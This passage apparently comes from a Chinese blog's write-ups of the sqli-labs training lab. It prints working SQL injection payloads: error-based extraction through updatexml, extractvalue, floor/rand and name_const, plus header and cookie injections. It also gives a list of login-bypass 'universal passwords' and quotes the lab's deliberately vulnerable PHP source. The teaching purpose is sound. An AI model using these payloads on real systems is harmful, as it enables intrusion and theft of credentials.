concat(0x7e,0x27,database(),0x27,0x7e)),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos; %23 返回 Duplicate entry &apos;~&apos;security&apos;~0&apos; for key &apos;group_key&apos; 获取表 uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos; %23 字段名 uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos;%23 获取用户信息 uname=admin&amp;passwd=&apos; or (select 1 from(select count(*),concat((select concat(0x27,id,0x7e,username,0x7e,password,0x27) from users limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) where username=&apos;admin&apos;%23 返回 Duplicate entry &apos;&apos;1~Dumb~Dumb&apos;1&apos; for key &apos;group_key&apos; 2、通过name_const():name_connsta(name,value):返回给定的值。用于生成结果集列时，NAME_CONST（）会使该列具有给定的名称。参数应该是常量。适用于低版本。 uname=admin&amp;passwd=1&apos; or (select * from (select(name_const(database(),1)),name_const(database(),1))a) where username=&apos;admin&apos;%23 报错 Incorrect arguments to NAME_CONST 数据库版本太高了 固定格式： ... or (select * from(select name_const((select ...),1),name_const((select...),1))a) ... 对于update,insert,delete都有一个固定结构：… or (select * from(select name_const((select …),1),name_const((select…),1))a) … 3、通过updatexml()payload: updatexml(1,concat(0x7e,(version())),0) updatexml(xml_target,xpath_expr,new_xml)函数： 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) 第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值 在这里只要改变第二个参数使其报错即可，由于对第一个参数进行了过滤检查，这里对passwd字段进行注入改变XML_document中符合XPATH_string的值 payloaduname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,version(),0x2b),1) %23 返回 XPATH syntax error: &apos;+5.5.53+&apos; uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,database(),0x2b),1) %23 返回：XPATH syntax error: &apos;+security+&apos; uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select group_concat(schema_name) from information_schema.schemata),0x2b),1) %23 返回：XPATH syntax error: &apos;+information_schema,challenges,m&apos;在这里只返回了部分信息 获取数据库名 uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1) %23 返回：XPATH syntax error: &apos;+information_schema+&apos; 获取表名 uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x2b),1) %23 返回：XPATH syntax error: &apos;+emails+&apos; 获取列名 uname=admin&amp;passwd=a&apos; or updatexml(1,concat(0x2b,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x2b),1) %23 XPATH syntax error: &apos;+id+&apos; 获取用户信息： 1、双注入查询 uname=admin&amp;passwd=&apos; or updatexml(1,concat(0x7e,(select * from(select concat_ws(char(32,44,32),id,username,password) from users limit 7,1)a),0x7e),0)# 返回XPATH syntax error: &apos;~8 , admin , admin~&apos; 这里要注意可能由于之前的更新操作把数据库里一些密码清空了 4、extractvalue()EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称 第二个参数：XPath_string (Xpath格式的字符串). 作用：从目标XML中返回包含所查询值的字符串适用与updatexml()相似 payloaduname=admin&amp;passwd=a&apos; or extractvalue(1,concat(0x2b,version(),0x2b)) %23 返回：XPATH syntax error: &apos;+5.5.53+&apos; uname=admin&amp;passwd=a&apos; or extractvalue(1,concat(0x2b,database(),0x2b)) %23 返回：XPATH syntax error: &apos;+security+&apos; 获取数据库名 uname=admin&amp;passwd=a&apos; or extractvalue(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1) ,0x2b)) %23 返回：XPATH syntax error: &apos;+information_schema+&apos; 其他与updatexml()相似 Less-18 POST-Header Injection-Uagent field-Error based基于错误的对头部UserAgent的post注入测试打开页面显示IP地址 Your IP ADDRESS is: 192.168.83.140 对post参数测试没有任何反应 查看源代码&lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,20); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; } $uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;]; $IP = $_SERVER[&apos;REMOTE_ADDR&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;Your IP ADDRESS is: &apos; .$IP; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your User Agent is: &apos; .$uagent; // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname = check_input($_POST[&apos;uname&apos;]); $passwd = check_input($_POST[&apos;passwd&apos;]); /* echo &apos;Your Your User name:&apos;. $uname; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Password:&apos;. $passwd; echo &quot;&lt;br&gt;&quot;; echo &apos;Your User Agent String:&apos;. $uagent; echo &quot;&lt;br&gt;&quot;; echo &apos;Your User Agent String:&apos;. $IP; */ //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Agent:&apos;.$uname.&quot;\n&quot;); fclose($fp); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; mysql_query($insert); //echo &apos;Your IP ADDRESS is: &apos; .$IP; echo &quot;&lt;/font&gt;&quot;; //echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;; echo &apos;Your User Agent is: &apos; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; 一开始就会回显登入的IP地址，然后对username的两个参数进行了检查过滤，所以这里测试时没有任何显示，sql语句验证了登入的账号密码是否相同，只有账号密码正确才能进行下一步的操作，可以这里是在已经注册了账号的前提下进行测试；正确登入后做了一个向security.uagents表插入useragent，ip地址，用户名的操作，再回显useragent，如果登入失败会进行报错。 $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot; 测试uname=admin&amp;passwd=admin 返回 Your IP ADDRESS is: 192.168.83.140 Your User Agent is: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 由于对username和password进行了过滤，这里考虑对没有进行过滤操作的uagents和ip_addr进行注入测试 使用burpsuit的repeater进行测试User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos; 返回 near &apos;192.168.83.140&apos;, &apos;admin&apos;)&apos; at line 1 分析：由单引号包裹，最后又括号闭合 构造payloadUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos;,1,2)# 返回正常 Your User Agent is: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos;,1,2)# 尝试在后面添加查询语句 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0&apos;,(select database()),2)# 并没有返回我们想要的信息 使用updatexml()进行注入版本号 &apos;or updatexml(1,concat(0x2b,version(),0x2b),1))# 返回：XPATH syntax error: &apos;+5.5.53+&apos; 当前数据库名 &apos;or updatexml(1,concat(0x2b,database(),0x2b),1))# XPATH syntax error: &apos;+security+&apos; 所有数据库名 &apos;or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1))# XPATH syntax error: &apos;+information_schema+&apos; 表名 &apos;or updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x2b),1))# XPATH syntax error: &apos;+emails+&apos; 列名 &apos;or updatexml(1,concat(0x2b,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x2b),1))# XPATH syntax error: &apos;+id+&apos; XPATH syntax error: &apos;+username+&apos; XPATH syntax error: &apos;+password+&apos; 获取账号信息 &apos;or updatexml(1,concat(0x2b,(select group_concat(username,password) from security.users limit 0,1),0x2b),1))# XPATH syntax error: &apos;+DumbDumb,AngelinaI-kill-you,Dum&apos; 在这里使用extractvalue()同样可以，注意是两个参数 &apos;or extractvalue(1,concat(0x2b,(select group_concat(username,password) from security.users limit 0,1),0x2b)))# XPATH syntax error: &apos;+DumbDumb,AngelinaI-kill-you,Dum&apos; Less-19 POST-Header Injection-Referer field-Error based基于错误的对头部Referer的post注入分析这里与Less-18相似，只不过注入的地方变成了referer，使用已知的账号密码登入 uname=admin&amp;passwd=admin Your IP ADDRESS is: 192.168.83.140 Your Referer is:burpsuit抓包如下 POST /sqli-labs/Less-19/ HTTP/1.1 Host: 192.168.83.141 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Forwarded-For: 123.232.23.245 CLTENT-IP: 123.232.23.245 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 24 uname=admin&amp;passwd=admin 我们看到上述请求中并没有referer这里使用hackbar或burpsuit直接在请求中添加 Referer: https://localhost/sql-labs/Less-19&apos;or updatexml(1,concat(0x2b,version(),0x2b),1))# XPATH syntax error: &apos;+5.5.53+&apos; 其他同上 在使用hackbar测试时遇到了一些麻烦，注释符号# 和–一直不起作用，抓包后发现没有了注释符#虽然有–，担不起作用，使用%23，这里的编码问题 Less-20 POST-Cookie injection-Uagent field-error based基于错误的对头部cookie的post注入测试uname=admin&amp;passwd=admin 返回 YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 YOUR IP ADDRESS IS : 192.168.83.140 DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE YOUR COOKIE : uname = admin and expires: Thu 26 Apr 2018 - 02:45:27 Your Login name:admin Your Password:admin Your ID:8 这里将一些关键信息都显示了，注意下面有个按钮 Delete You cookie! ,点击后直接跳转到登入页面，可以推测应该有一个对cookie进行操作的过程 burpsuit抓取删除cookie操作的数据包POST /sqli-labs/Less-20/index.php HTTP/1.1 Host: 192.168.83.141 User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.83.141/sqli-labs/Less-20/index.php Cookie: uname=admin X-Forwarded-For: 123.232.23.245 CLTENT-IP: 123.232.23.245 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 28 submit=Delete+Your+Cookie%21 源代码&lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); if(!isset($_COOKIE[&apos;uname&apos;])) { //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); echo &quot;&lt;div style=&apos; margin-top:20px;color:#FFF; font-size:24px; text-align:center&apos;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&apos;#FF0000&apos;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;; echo &quot;&lt;div align=&apos;center&apos; style=&apos;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&apos;&gt;&quot;; echo &quot;&lt;div style=&apos;padding-top:10px; font-size:15px;&apos;&gt;&quot;; echo &quot;&lt;!--Form to post the contents --&gt;&quot;; echo &apos;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&apos;; echo &apos; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&apos;; echo &apos; &lt;input type=&quot;text&quot; name=&quot;uname&quot; value=&quot;&quot;/&gt; &lt;/div&gt;&apos;; echo &apos; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&apos;; echo &apos; &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&apos;; echo &apos; &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&apos;; echo &apos;&lt;/form&gt;&apos;; echo &apos;&lt;/div&gt;&apos;; echo &apos;&lt;/div&gt;&apos;; echo &apos;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&apos;; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;; echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;; echo &apos;&lt;/center&gt;&apos;; function check_input($value) { if(!empty($value)) { $value = substr($value,0,20); // truncation (see comments) } if (get_magic_quotes_gpc()) // Stripslashes if magic quotes enabled { $value = stripslashes($value); } if (!ctype_digit($value)) // Quote if not a number { $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;; } else { $value = intval($value); } return $value; } echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname = check_input($_POST[&apos;uname&apos;]); $passwd = check_input($_POST[&apos;passwd&apos;]); $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); $cookee = $row1[&apos;username&apos;]; if($row1) { echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;; setcookie(&apos;uname&apos;, $cookee, time()+3600); header (&apos;Location: index.php&apos;); echo &quot;I LOVE YOU COOKIES&quot;; echo &quot;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&apos;; //echo &apos;Your Cookie is: &apos; .$cookee; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } echo &quot;&lt;/font&gt;&quot;; echo &apos;&lt;/font&gt;&apos;; echo &apos;&lt;/div&gt;&apos;; } else { if(!isset($_POST[&apos;submit&apos;])) { $cookee = $_COOKIE[&apos;uname&apos;]; $format = &apos;D d M Y - H:i:s&apos;; $timestamp = time() + 3600; echo &quot;&lt;center&gt;&quot;; echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;; echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; echo &apos;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&apos;; echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&apos;HTTP_USER_AGENT&apos;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&apos;; echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&apos;REMOTE_ADDR&apos;]; echo &quot;&lt;/font&gt;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&apos;; echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;orange&quot; font size = 5 &gt;&apos;; echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp); echo &quot;&lt;br&gt;&lt;/font&gt;&quot;; $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); if (!$result) { die(&apos;Issue with your mysql: &apos; . mysql_error()); } $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&apos;; echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&apos;; echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;Your ID:&apos; .$row[&apos;id&apos;]; } else { echo &quot;&lt;center&gt;&quot;; echo &apos;&lt;br&gt;&lt;br&gt;&lt;br&gt;&apos;; echo &apos;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&apos;; echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;; //echo &apos;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&apos;; } echo &apos;&lt;center&gt;&apos;; echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;; echo &apos;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&apos;; echo &apos;&lt;/form&gt;&apos;; echo &apos;&lt;/center&gt;&apos;; } else { echo &apos;&lt;center&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&apos;; echo &quot; Your Cookie is deleted&quot;; setcookie(&apos;uname&apos;, $row1[&apos;username&apos;], time()-3600); header (&apos;Location: index.php&apos;); echo &apos;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&apos;; } echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; //header (&apos;Location: main.php&apos;); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; //echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&apos;; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;Cookie:&apos;.$cookee.&quot;\n&quot;); fclose($fp); } ?&gt; 分析1、判断cookie是否存在，不存在则进行登入验证 2、登入时对uname,passwd先进行过滤，过滤后验证是否正确，将变量cookie赋值为username，设置cookie为uname+time()+3600 3、没点击submit按钮，则显示详细信息，包括user agent、IP、cookie,查询对应cookie的账号密码并显示 4、若点击了submit按钮，重置cookie，并重定向到登入页面 关键代码，对cookie对应的用户进行了查询，且变量$cookee并未进行过滤，而该变量的值是由username传递而来 $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;; payload添加单引号测试 Cookie: uname=admin&apos; 返回：near &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1由单引号包裹 admin&apos;or 1=1# 返回正常 遍历数据库名 admin&apos;or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1)# XPATH syntax error: &apos;+information_schema+&apos; 其他同上 Less-21 Cookie Injection- Error Based- complex - stringLess-21与Less-20的不同之处在于cookie对uname进行了bse64编码 setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600); 测试uname=admin&apos;经过base64编码后 uname=YWRtaW4n near &apos;&apos;admin&apos;&apos;) LIMIT 0,1&apos; at line 1 可以看到由单引号和括号包裹 admin&apos; or 1=1)# YWRtaW4nIG9yIDE9MSkj返回正常 构造payload遍历系统数据库名 admin&apos; or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1))# YWRtaW4nIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDJiLChzZWxlY3Qgc2NoZW1hX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEgbGltaXQgMCwxKSwweDJiKSwxKSkj 返回XPATH syntax error: &apos;+information_schema+&apos; 其他同上 Less-22 Cookie Injection- Error Based- Double Quotes - string测试uname=admin&apos; uname=YWRtaW4n 未报错 admin&quot; YWRtaW4i near &apos;&quot;admin&quot;&quot; LIMIT 0,1&apos; at line 1 由双引号包裹 admin&quot; or 1=1# YWRtaW4iIG9yIDE9MSM=返回正常 构造payloadadmin&quot; or updatexml(1,concat(0x2b,(select schema_name from information_schema.schemata limit 0,1),0x2b),1)# YWRtaW4iIG9yIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDJiLChzZWxlY3Qgc2NoZW1hX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuc2NoZW1hdGEgbGltaXQgMCwxKSwweDJiKSwxKSM= XPATH syntax error: &apos;+information_schema+&apos; 其他同上 参考 SQLi-Labs 学习笔记]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-11-16]]></title>
    <url>%2F2018%2F04%2F23%2Fsqli-labs-Less-11-16%2F</url>
    <content type="text"><![CDATA[Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1: &quot;or &quot;a&quot;=&quot;a 2： &apos;)or(&apos;a&apos;=&apos;a 3：or 1=1-- 4：&apos;or 1=1-- 5：a&apos;or&apos; 1=1-- 6： &quot;or 1=1-- 7：&apos;or&apos;a&apos;=&apos;a 8： &quot;or&quot;=&quot;a&apos;=&apos;a 9：&apos;or&apos;&apos;=&apos; 10：&apos;or&apos;=&apos;or&apos; 11: 1 or &apos;1&apos;=&apos;1&apos;=1 12: 1 or &apos;1&apos;=&apos;1&apos; or 1=1 13: &apos;OR 1=1%00 14: &quot;or 1=1%00 15: &apos;xor 16: 新型万能登陆密码 用户名 &apos; UNION Select 1,1,1 FROM admin Where &apos;&apos;=&apos; （替换表名admin） 密码 1 Username=-1%cf&apos; union select 1,1,1 as password,1,1,1 %23 Password=1 17..admin&apos; or &apos;a&apos;=&apos;a 密码随便 PHP万能密码 &apos;or&apos;=&apos;or&apos; &apos;or 1=1/* 字符型 GPC是否开都可以使用 User: something Pass: &apos; OR &apos;1&apos;=&apos;1 jsp 万能密码 1&apos;or&apos;1&apos;=&apos;1 admin&apos; OR 1=1/* 用户名：admin 系统存在这个用户的时候 才用得上 密码：1&apos;or&apos;1&apos;=&apos;1 payload（1）万能密码在passwd字段后面构造万能密码+闭合单引号 uname=admin&amp;passwd=1&apos; or &apos;1&apos;=&apos;1&amp;submit=Submit 返回 Your Login name:Dumb Your Password:Dumb 在uname字段后面构造万能密码+闭合单引号 uname=admin&apos; or &apos;1&apos;=&apos;1&amp;passwd=1&amp;submit=Submit 返回 Your Login name:admin Your Password:admin 我们发现两者返回的账户密码不一样，查看源代码 &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in\n\n &quot; ; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; sql语句如下： SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1 情况一： SELECT username, password FROM users WHERE username=&apos;admin&apos; and password=&apos;1&apos; or &apos;1&apos;=&apos;1&apos; LIMIT 0,1 情况二： SELECT username, password FROM users WHERE username=&apos;admin&apos; or &apos;1&apos;=&apos;1&apos; and password=&apos;1&apos; LIMIT 0,1 and 优先级高，所以情况一前面为False，但是与True或运算为true，返回了第一个账号和密码；情况二后面为False，但存在admin这个账户，或运算为True，返回了admin账号的账号和密码 （2）联合查询uname=test &amp;passwd=test&apos; order by 3%23 返回错误 uname=test &amp;passwd=test&apos; order by 2%23 返回正确 uname=test &amp;passwd=test&apos; union select 1,2 %23 返回：Your Login name:1 Your Password:2 剩下的注入查询数据库信息与之前get类似 Less-12 POST - Error Based - Double quotes - String -with twist基于报错的双引号带括号的字符注入与Less-11类似 payload1、直接注释 uname=admin &amp;passwd=1&quot;) or &quot;1&quot;=&quot;1&quot; %23 2、闭合绕过 uname=admin &amp;passwd=1&quot;) or (&quot;1&quot;=&quot;1 uname=admin&quot;) or( &quot;1&quot;=&quot;1 &amp;passwd=1 联合查询 uname=test &amp;passwd=test&quot;) order by 3 %23返回错误 uname=test &amp;passwd=test&quot;) order by 2 %23返回正确 uname=test &amp;passwd=test&quot;) union select 1,2 %23 返回： Your Login name:1 Your Password:2 同上 Less-13 POST-Double Injection-Single quotes-String -with twist测试加单引号 uname=test &amp;passwd=test&apos; 报错如下 &apos;&apos;test&apos;&apos;) LIMIT 0,1&apos; 可知是单引号和括号包裹变量 uname=test &amp;passwd=test&apos;) %23返回正常 uname=test &amp;passwd=test&apos;) or 1=1%23 显示successfully loggend in 源代码如下： &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in &quot; ; echo 